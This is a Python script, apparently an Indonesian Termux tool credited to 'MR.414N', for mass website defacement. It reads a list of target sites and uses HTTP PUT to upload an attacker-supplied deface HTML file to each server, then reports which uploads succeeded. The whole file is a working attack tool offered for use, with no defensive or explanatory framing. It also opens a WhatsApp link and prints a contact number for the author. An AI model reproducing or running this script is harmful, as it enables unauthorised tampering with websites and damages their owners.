#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("install requests dan ulangi 🤦 ...")
   
os.system("clear")
os.system("toilet SILAHKAN|lolcat")
os.system("toilet CHAT|lolcat")
os.system("toilet WAl |lolcat")
os.system("toilet GUE|lolcat")
os.system("toilet MR.414N|lolcat -a")
os.system('termux-open https://wa.me/15512131770')
os.system("clear")
os.system("toilet LANOX|lolcat")
banner = """
═════════════════════════════════════════════════════
[+] Author  : MR.414N
[+] Github  : github.com/MR414N-ID
[+] WA      : 082292838634
═════════════════════════════════════════════════════
[+] PESAN   : jika sc deface/ sc html km blm ad di sini
             silahkan pindahkan ke sini yang gak tau
             caranya silahkan chat gw✌️✌️ ok👌
[+] PESAN   : jika ingin menambah target silahkan 
              memberhentikan tools ini dengan ketik 
              CTRL +Z dan jika sudah berhenti
              silahkan ketik nano target.txt 
              dan silahkan tambahkan target😇
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("SILAHKAN MENUNGGU HASIL %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" GAGAL😭"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" BERHASIL"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("masukan sc deface yg lu miliki🖕 : ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
